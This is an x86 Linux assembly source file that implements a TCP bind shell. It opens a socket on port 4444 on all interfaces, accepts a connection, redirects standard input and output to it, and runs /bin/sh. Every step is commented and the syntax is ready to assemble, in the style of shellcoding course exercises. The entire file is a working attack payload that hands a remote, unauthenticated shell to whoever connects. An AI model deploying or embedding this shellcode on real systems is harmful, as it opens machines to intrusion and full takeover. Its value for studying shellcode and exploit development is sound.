; Filename bind_shell.nasm
; Author:  Dave Sully
;
; Purpose: TCP bind shell 

global _start			

section .text
_start:
	; Clear everthing we are using 
	xor eax, eax 
	xor ebx, ebx 
	xor ecx, ecx 
	xor edx, edx 
	xor esi, esi
	xor edi, edi

	; Set up a syscall for creating a socket 
	; int socket(int domain, int type, int protocol);
	; syscall = 359 Goes in EAX 
	; EBX 2
	; ECX 1 
	; EDX 0
	mov ax, 0x167  ; move 359 to al
	mov bl, 0x2 ; move 2 to bl 
	mov cl, 0x1 ; move 1 to cl
	mov edx, ecx ; move 1 into edx
	sub edx, 0x1 ; then subtract 1 to make zero 
	int 0x80
	xchg esi, eax ; socket file descriptor now stored in esi

	; Set up syscall for bind 
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; syscall = 361 (EAX)
	; EBX = esi
	; ECX = sockaddr structure (pointer to)
	; EDX = len(sockaddr structure) 
	; First we are going to build the structure need for sockaddr on the stack (reverse order)

	xor edx, edx
	push edx ; currently 0 (INADDR_ANY)
	push word 0x5c11 ; Port 4444 (reverse byte order 4444 = 0x115c)
	push word 0x2 ; (AF-INET)

	; Now assemble the actual call 
	mov ax, 0x169 ; Syscall 361 
	mov ebx, esi ; fd for socket 
	mov ecx, esp ; Structure for sockaddr, eg point ecx at the stack
	mov dl, 0x10 ; length of sockaddr (16)
	int 0x80 ; call system interupt 

	; Setup syscall for listen 
	; int listen(int sockfd, int backlog);
	; syscall listen = 363
	mov ax, 0x16b ; system call 363
	mov ebx, esi ; fd for our socket 
	xor ecx, ecx ; clear ecx (int backlog = 0) 
	int 0x80 ; call system interupt 

	; Setup syscall for accept 
	; syscall 364
	; int accept4(int sockfd, struct sockaddr *addr,
        ;           socklen_t *addrlen, int flags);

	mov ax, 0x16c ; syscall 364 
	mov ebx, esi ; Socket fd 
	xor ecx, ecx ; null ecx and edx 
	xor edx, edx
	push esi ; save esi on the stack for now 
	xor esi, esi
	int 0x80 
	pop esi ; Get the value back 
	mov edi, eax ; store incoming fd in edi

	; Setup duplicate file descriptors for our socket 
	; int dup2(int oldfd, int newfd);
	; syscall 63
	mov al, 0x3f ; syscall 63
	mov ebx, edi ;  
	mov cl, 0x2
	int 0x80 
	dec ecx
	mov al, 0x3f ; syscall 63
	int 0x80 
	dec ecx
	mov al, 0x3f ; syscall 63	
	int 0x80 

	; Finally run a shell 
	; Execve = syscall 11
	; (const char *filename, char *const argv[], char *const envp[]);

	xor eax,eax ; null eax 
	mov al, 0xb ; syscall 11 into eax
	xor ebx, ebx ; zero ebx 
	push ebx ; push a null string to the stack to terminate our string 
	push 0x68732f2f ; hs//
	push 0x6e69622f ; nib/
	mov ebx, esp ; point ebx at the stack
	xor ecx, ecx ; clear ecx and edx as they are used in the syscall 
	xor edx, edx
	int 0x80 

section .data

